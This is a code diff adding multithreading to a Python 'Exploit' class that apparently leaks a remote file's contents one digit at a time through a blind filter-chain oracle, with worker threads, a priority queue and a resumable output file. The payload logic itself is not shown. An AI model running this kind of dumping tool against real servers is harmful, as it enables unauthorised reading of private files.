@@ -14,6 +14,10 @@ from __future__ import annotations
 from functools import cache, cached_property
 from itertools import product
 from dataclasses import dataclass, field
+import queue
+from threading import Thread
+import threading
+from typing import Literal
 
 from rich.live import Live
 from rich.text import Text
@@ -56,6 +60,7 @@ B64DE = (
     "output",
     "Path to the output file. If not set, the file is not stored. If set, and the file already exists, the dump will resume from where it stopped.",
 )
+@arg("workers", "Number of workers. Defaults to 2.")
 @arg("silent", "If set, do not display the file as it is being dumped")
 @arg("debug", "If set, writes logs to debug.log")
 class Exploit:
@@ -72,10 +77,11 @@ class Exploit:
     )
 
     def __init__(
-        self, path: str, output: str = None, silent: bool = False, debug: bool = False
+        self, path: str, output: str = None, workers: int=2, silent: bool = False, debug: bool = False
     ) -> None:
         self.path = path
         self.output = output
+        self.nb_workers = workers
         self.debug = debug
         self.remote = Remote()
         self.digits = [BaseDigit()]
@@ -171,9 +177,7 @@ class Exploit:
         leave()
 
     def run(self) -> None:
-        """Loop method. Most of the code here is about handling the display. The
-        important code starts from the `get_digit` method.
-        """
+        """Multithreaded digit dump: each worker gets a unique i, stops at EOF."""
         if self.debug:
             logging.set_file("./debug.log")
 
@@ -188,20 +192,73 @@ class Exploit:
             )
 
         interrupted = False
+        max_workers = self.nb_workers
+        
+        next_index = len(self.digits)
+        next_index_lock = threading.Lock()
+        eof_index = [None]  # Use a list for mutability in threads
+        digits_lock = threading.Lock()
 
         if self._display:
             live = Live(self._get_renderable(), console=get_console(), transient=True)
             live.start()
         else:
             live = None
+            
+        digit_queue = queue.PriorityQueue()
+            
+        def storer():
+            while not interrupted:
+                try:
+                    i, value = digit_queue.get(timeout=.5)
+                except queue.Empty:
+                    continue
+                if i == len(self.digits):
+                    self.digits.append(value)
+                    self._write_output()
+                    if live:
+                        live.update(self._get_renderable())
+                else:
+                    digit_queue.put((i, value))
 
-        # Grab digits until we hit EOF
+
+        def worker():
+            nonlocal next_index
+
+            while not interrupted:
+                with next_index_lock:
+                    if eof_index[0] is not None and next_index >= eof_index[0]:
+                        break
+                    i = next_index
+                    next_index += 1
+
+                # print("LOOKING FOR DIGIT", i)
+                digit = None
+                
+                while not interrupted:
+                    try:
+                        digit = self.get_digit(i)
+                    except (NoJumpException, NoPathException):
+                        continue
+                    break
+                # print(i, "GOT DIGIT", digit)
+                if digit is None:
+                    # print(i, "WE NONE")
+                    with next_index_lock:
+                        if eof_index[0] is None or i < eof_index[0]:
+                            eof_index[0] = i
+                    break
+
+                digit_queue.put((digit.index, digit))
+            
+        threads = [threading.Thread(target=worker) for _ in range(max_workers)]
+        threads.append(threading.Thread(target=storer))
+        
         try:
-            while digit := self.get_digit():
-                self.digits.append(digit)
-                self._write_output()
-                if live:
-                    live.update(self._get_renderable())
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join()
         except KeyboardInterrupt:
             interrupted = True
         finally:
@@ -259,10 +316,10 @@ class Exploit:
             msg_info(f"To rollback: {'|'.join(path.set.back)}")
             failure(f"Expected {expected}, got {digit}")
 
-    def get_digit(self) -> PositionalDigit | None:
-        log.info(f"Dumping digit #{len(self.digits)}")
+    def get_digit(self, i: int) -> PositionalDigit | None:
+        log.info(f"Dumping digit #{i}")
 
-        path = self.get_best_path(len(self.digits))
+        path = self.get_best_path(i)
         digit = self.get_digit_value(path.filters + path.set.back)
 
         if digit is None:
@@ -270,15 +327,13 @@ class Exploit:
 
         # self._debug_check_expected(path, digit)
 
-        digit = PositionalDigit(len(self.digits), digit)
-        log.info(f"Got #{digit.index} <{digit.digit}>")
+        positional_digit = PositionalDigit(i, digit)
+        log.info(f"Got #{positional_digit.index} <{positional_digit.digit}>")
 
-        p = len(self.digits)
+        for previous_digit in self.digits[:i]:
+            previous_digit.update_breakable(i, positional_digit.digit)
 
-        for previous_digit in self.digits:
-            previous_digit.update_breakable(p, digit.digit)
-
-        return digit
+        return positional_digit
 
     def _neighbours(self, p: int) -> list[PositionalDigit]:
         """Every node we can jump from to reach p."""
@@ -328,7 +383,7 @@ class Exploit:
         raise NoPathException(f"No swap path available for {target=}")
 
     def compute_jump(self, landing: PositionalDigit, target: int) -> JumpDescription:
-        """Compute the best way to jump to the digit at offset `p`."""
+        """Compute the best way to jump to the digit at offset `target`."""
         assert target >= len(self.digits)
 
         if not landing.has_set():
@@ -424,15 +479,16 @@ class Exploit:
 
         # The simplest way to pull this off is to use a jump from a digit right before
 
-        previous = self.digits[p - 1]
-        try:
-            jump = self.get_or_compute_jump(previous, p)
-        except NoJumpException:
-            pass
-        else:
-            jump_idx = f"#{jump.parent.index}" if jump.parent else "start"
-            log.debug(f"Found path using jump from {jump_idx} to #{p}")
-            return DigitPath(previous.set, jump.filter_chain(p))
+        if p - 1 < len(self.digits):
+            previous = self.digits[p - 1]
+            try:
+                jump = self.get_or_compute_jump(previous, p)
+            except NoJumpException:
+                pass
+            else:
+                jump_idx = f"#{jump.parent.index}" if jump.parent else "start"
+                log.debug(f"Found path using jump from {jump_idx} to #{p}")
+                return DigitPath(previous.set, jump.filter_chain(p))
 
         # Otherwise, we can perform a swap
 
